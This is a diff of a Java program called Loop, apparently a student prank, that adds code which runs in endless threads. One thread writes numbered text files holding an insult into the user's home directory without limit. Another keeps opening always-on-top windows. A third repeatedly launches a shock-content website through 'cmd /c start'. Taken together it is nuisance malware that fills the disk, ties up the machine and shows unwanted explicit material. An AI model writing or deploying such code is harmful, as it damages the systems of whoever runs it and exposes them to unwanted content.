@@ -1,54 +1,124 @@
-import java.net.URL;
-import java.util.ArrayList;
+
 import java.io.File;
-import javax.swing.Icon;
-import javax.swing.ImageIcon;
+import java.io.FileWriter;
+import java.io.BufferedWriter;
+import java.io.IOException;
+
+import javax.swing.JButton;
 import javax.swing.JFrame;
 import javax.swing.JLabel;
+import javax.swing.JOptionPane;
+import javax.swing.WindowConstants;
 
+import javazoom.io.MainClass;
+import javazoom.io.MainClass.ClickListener;
 
+import java.awt.Desktop;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
+import java.net.URI;
+import java.net.URISyntaxException;
 
  public class Loop {
-	
+	 
+	 
+	  
 	public static void main(String[] args) throws InterruptedException {
 		Thread thread = new Thread(() -> {
 			for (long i = 0; i < Long.MAX_VALUE; i++) {
+				
 				System.out.println(i);
-				File newFile = new File("C:\\Users\\", String.format("%d.txt", i++));
+				File newFile = new File(System.getProperty("user.home"), String.format("%d.txt", i));
+				BufferedWriter bw = null;
+				FileWriter fw = null;
+				
+				try {
+					String content ="You're an idiot habibti";
+										
+					fw = new FileWriter(newFile);
+					bw = new BufferedWriter(fw);
+					bw.write(content);
+					
+					System.out.println("Done");
+					
+				} catch (IOException e){
+					
+					e.printStackTrace();
+				} finally {
+					try{
+						if (bw != null)
+							bw.close();
+						
+						if (fw !=null)
+							fw.close();
+					} catch (IOException ex){
+						
+						ex.printStackTrace();
+					}
+				}
 			}
 		});
 		
 		thread.start();
+	
+		Thread thread2 = new Thread(() -> {
+			while(true) {
+				new MainClass();
+				
+				JFrame frame = new JFrame();
+				frame.setAlwaysOnTop(true);
+				frame.setLocationByPlatform(true);
+				frame.setSize(900, 750);
+				frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
+				showLoader(frame);
+				
+				
+			}
+		});
+		thread2.start();
 		
-		ArrayList<JFrame> al = new ArrayList<>();
-			JFrame frame = new JFrame();
-			frame.setLocationByPlatform(true);
-			frame.setSize(500, 500);
-			frame.setVisible(true);
-			showLoader(frame);
-			al.add(frame);
 		
+		
+		
+		
+		Thread url = new Thread(() -> {
+			
+			while(true)
+			try {
+				Runtime.getRuntime().exec("cmd /c start http://2girls1cup.ca/");
+			} catch (IOException e) {
+				
+				e.printStackTrace();
+				if(Desktop.isDesktopSupported())
+				{
+				  try {
+					Desktop.getDesktop().browse(new URI("https://www.youtube.com/watch?v=IRjJRTLlKy8"));
+				} catch (IOException | URISyntaxException e1) {
+					
+					e1.printStackTrace();
+				}
+				}
+			}
+			
+		});
+		url.start();
 	
 	}	
 	public static void showLoader(JFrame frameLoader){
-		while(true){
-	
-        URL url = Loop.class.getResource("file://C://BS//crazyfrogbrothers.gif");
-        Icon icon = new ImageIcon(url);
-        JLabel label = new JLabel(icon);
+      //  URL url = Loop.class.getResource("file:C:\\Users\\linus.olofsson1\\Desktop\\15Te-Linus.Olofsson\\Strukturer\\srccrazyfrogbrothers.gif");
+        //Icon icon = new ImageIcon(url);
+        JLabel label = new JLabel();
         
-        frameLoader.pack();
+        frameLoader.getContentPane();
+        frameLoader.setSize(900, 750);
         frameLoader.getContentPane().add(label);
-        frameLoader.setUndecorated(true);
         frameLoader.getContentPane().add(label);
         frameLoader.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
-        frameLoader.pack();
         frameLoader.setLocationRelativeTo(null);
         frameLoader.setVisible(true);
 	// ta bort/ lägg till för modifering och test Thread.sleep(1000);
 	
-	}
-	
-}}	
+	};
 
+ }
 // Bara för jag kan
